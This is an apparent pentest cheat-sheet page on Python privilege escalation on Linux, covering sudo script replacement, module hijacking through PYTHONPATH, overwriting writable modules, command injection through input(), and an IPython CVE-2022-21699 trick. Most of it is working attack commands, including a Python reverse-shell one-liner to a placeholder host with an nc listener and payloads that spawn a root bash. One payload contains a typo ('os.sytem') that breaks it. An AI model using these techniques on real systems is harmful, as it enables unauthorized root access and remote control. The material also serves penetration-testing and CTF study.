---
title: Python Privilege Escalation
description: Python binary is vulnerable to privilege escalation in some situations.
tags:
    - Privilege Escalation
refs:
    - https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/
date: 2023-03-29
draft: false
---

## Sudo PrivEsc

### Replace with Arbitrary Script

```bash
sudo -l

(root) NOPASSWD: /usr/bin/python3 /home/<username>/example.py
```

If the python script is under the current user's home directory, we can remove the script and create the new one with the same name.

```bash
rm -rf /home/<username>/example.py
touch /home/<username>/example.py
```

We can insert arbitrary code in the new script. For example,

```python
import os;os.system('/bin/bash')
```

### Module Hijacking

Assume the python script can be executed as root with **SETENV,NOPASSWD**.  
For example,

```sh
sudo -l

(root) SETENV: NOPASSWD: /usr/bin/python3 /opt/example.py
```

With **SETENV**, we can change **PYTHONPATH** when executing the script, and insert malicious script to the module which is imported in the script.  
First off, check what module is imported in the python script (e.g. /opt/example.py here).

```python
import random

print(random.randint(1, 8))
```

We can forge the imported module.

```sh
vim /tmp/random.py
```

The content of the module is below. This is a script that executes reverse shell.  
Replace **`<local-ip>`** with your local ip address.

```sh
import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
```

After that, in another local terminal, start listener for getting a shell.

```sh
nc -lvnp 4444
```

Then run the python script with updating **PYTHONPATH** in the remote machine.

```sh
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/example.py
```

By setting **"PYTHONPATH=/tmp/"**, the python script will import modules from **/tmp/** directories so the **"random"** module is imported from **/tmp/random.py**.  
Finally, we should get a shell in local terminal.

### Module Overriding

If the Python script contains a module that can be modified by current user, we can inject arbitrary code into the module.  
First, check what modules the Python script uses.

```bash
# example.py
import random
```

Assume the **“random”** module is used in the script.  
Find the path of the module and check if it’s writable.

```bash
find / -name "random.py" 2>/dev/null
ls -al /usr/lib/python3.6/random.py
```

If we know we can modify it, inject arbitrary code in this module.  
Assume the **“random”** module path is **`/usr/lib/python3.6/random.py`**.

```python
# /usr/lib/python3.6/random.py
import os;os.sytem('/bin/bash')
```

Then execute the Python script and we can spawn the root shell.

<br />

## OS Commands in input()

If you find the executable which is created in Python.  
For instance,

```sh
./executable

Enter some input:
```

You can enter OS commands in some input.

```py
__import__('os').system('id')
```

For example,

```sh
./executable

Enter some input: __import__('os').system('id')
```

<br />

## IPython Privilege Escalation ([CVE-2022-21699](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x))

Interective Python (IPython) is a command shell for interective computing in multiple programming languages.

```sh
# -m: file mode (rwx)
mkdir -m 777 /tmp/profile_default
mkdir -m 777 /tmp/profile_default/startup
echo 'print("stealing your private secrets")' > /tmp/profile_default/startup/exploit.py
```
